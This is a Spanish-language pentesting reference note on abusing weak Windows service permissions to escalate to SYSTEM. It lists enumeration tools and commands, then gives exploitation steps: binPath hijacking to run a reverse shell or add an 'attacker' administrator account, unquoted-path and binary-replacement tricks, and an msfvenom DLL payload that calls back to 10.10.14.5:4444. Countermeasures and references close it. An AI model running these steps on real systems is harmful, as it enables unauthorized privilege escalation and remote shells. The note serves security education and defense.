# Abuso de Servicios de Windows

## Descripción
Los servicios de Windows son procesos que se ejecutan en segundo plano, frecuentemente con privilegios de SYSTEM. Cuando un servicio tiene permisos de configuración débiles — como permitir a usuarios sin privilegios modificar la ruta del ejecutable, detener/reiniciar el servicio, o escribir en el directorio donde reside el binario — un atacante puede abusar de estas configuraciones para ejecutar código arbitrario como SYSTEM. Los vectores principales incluyen: modificación de la ruta del binario del servicio (binPath), reemplazo del ejecutable (unquoted service paths), DLL hijacking en el directorio del servicio, y abuso de permisos débiles en el registro de servicios.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1574.010 (Hijack Execution Flow: Services File Permissions Weakness); T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **accesschk.exe** (Sysinternals, `accesschk -uwcqv`) — verificar permisos sobre servicios, archivos y directorios
- **sc.exe** (`qc`, `config`, `start`, `stop`) — consulta y manipulación de servicios
- **icacls** — análisis de permisos NTFS en archivos y directorios
- **PowerUp.ps1** (PowerSploit) — enumeración automatizada de vectores de abuso de servicios
- **winPEAS** (`winpeas.exe`) — enumeración que identifica servicios con permisos débiles

## Comandos / Ejemplos

### Enumeración de servicios vulnerables
```powershell
# Listar servicios con permisos modificables por el usuario actual
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Consultar configuración de un servicio específico
sc qc VulnerableService
# Buscar: SERVICE_START_NAME (cuenta), BINARY_PATH_NAME, START_TYPE

# Buscar servicios con rutas sin comillas (Unquoted Service Paths)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
# Rutas como C:\Program Files\My App\service.exe son vulnerables si no están entre comillas

# Enumeración con PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# Reporta: servicios modificables, unquoted paths, DLL hijacking, etc.
```

### Explotación: modificar binPath del servicio
```powershell
# Si el usuario puede modificar la configuración del servicio
sc config VulnerableService binPath= "C:\temp\reverse_shell.exe"
sc stop VulnerableService
sc start VulnerableService
# Resultado: reverse_shell.exe se ejecuta como SYSTEM

# Alternativa: ejecutar comando directo
sc config VulnerableService binPath= "cmd /c net localgroup administrators attacker /add"
sc stop VulnerableService
sc start VulnerableService
```

### Explotación: Unquoted Service Paths
```powershell
# Si el servicio tiene binPath: C:\Program Files\My App\service.exe (sin comillas)
# Windows intenta ejecutar en este orden:
# 1. C:\Program.exe
# 2. C:\Program Files\My.exe
# 3. C:\Program Files\My App\service.exe

# Verificar permisos de escritura en directorios intermedios
icacls "C:\Program Files\My App"

# Si se puede escribir en C:\Program Files\
# Colocar payload como C:\Program Files\My.exe
copy C:\temp\reverse_shell.exe "C:\Program Files\My.exe"

# Reiniciar el servicio
sc stop VulnerableService
sc start VulnerableService
```

### Explotación: reemplazo de ejecutable
```powershell
# Si se tiene permiso de escritura sobre el binario del servicio
icacls "C:\Program Files\VulnApp\service.exe"
# Resultado: BUILTIN\Users:(F) ← Full control = vulnerable

# Respaldar original y reemplazar con payload
move "C:\Program Files\VulnApp\service.exe" "C:\Program Files\VulnApp\service.bak"
copy C:\temp\reverse_shell.exe "C:\Program Files\VulnApp\service.exe"

# Reiniciar servicio
sc stop VulnerableService
sc start VulnerableService
```

### Explotación: DLL Hijacking en servicios
```powershell
# Identificar DLLs faltantes que el servicio intenta cargar
# Usar Process Monitor (ProcMon) filtrando por "NAME NOT FOUND" en operaciones de DLL

# Crear DLL maliciosa
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijacked.dll

# Colocar la DLL en el directorio donde el servicio la busca
copy hijacked.dll "C:\Program Files\VulnApp\missing.dll"

# Reiniciar el servicio
sc stop VulnerableService
sc start VulnerableService
```

## Contramedidas
- Asegurar que las rutas de binarios de servicios estén entre comillas en el registro
- Aplicar permisos restrictivos a los directorios y ejecutables de servicios (solo administradores con permisos de escritura)
- Configurar servicios para ejecutarse con cuentas de servicio administradas (gMSA) en lugar de SYSTEM cuando sea posible
- Auditar permisos de servicios periódicamente con `accesschk.exe` o PowerUp
- Habilitar protección de DLL: `SafeDllSearchMode` activado y `CWDIllegalInDllSearch` configurado
- Monitorear cambios en la configuración de servicios: Event ID 7045 (nuevo servicio instalado) y Event ID 4697

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1574.010: Hijack Execution Flow: Services File Permissions Weakness. https://attack.mitre.org/techniques/T1574/010/
- MITRE Corporation. (2024). ATT&CK Technique T1574.001: Hijack Execution Flow: DLL Search Order Hijacking. https://attack.mitre.org/techniques/T1574/001/
- PowerShellMafia. (s.f.). *PowerSploit* [Software]. GitHub. https://github.com/PowerShellMafia/PowerSploit
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- Notas del proyecto: notas-md/INE Courses/INE Courses/Windows Privilege Escalation.md
